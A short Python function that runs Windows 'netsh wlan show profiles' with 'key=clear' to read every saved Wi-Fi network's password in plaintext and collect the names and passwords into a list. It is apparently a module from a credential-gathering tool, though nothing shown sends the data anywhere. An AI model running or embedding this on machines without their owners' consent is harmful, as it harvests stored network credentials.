import subprocess
import re
import os

def password(set):
    temp_out = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles'],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    data_network = ''
    while temp_out.poll() is None:
        data_network = data_network + temp_out.stdout.readline().decode('utf-8')
    networks = re.findall("(?:Profile\s*:\s)(.*?\\r)",data_network)

    for i in networks:
        i = i.replace("\r", "")
        Wifi_name = i
        temp_out = subprocess.Popen(['netsh', 'wlan', 'show', 'profiles', i, "key=clear"],shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = ""
        while temp_out.poll() is None:
            output = output + temp_out.stdout.readline().decode('utf-8')
        password = ""
        pas = re.findall("(?:Key\sContent\s*:\s)(.*?\\r)", output)
        if pas:
            password = pas[0]

        cpass = ""

        n=1
        if len(password) > 1:
            for letter in password:
                if n > len(password)-1:
                    break

                cpass = cpass + letter
                n=n+1


        set.append(dict(type="wifi", ssid=Wifi_name, password=cpass))
    return set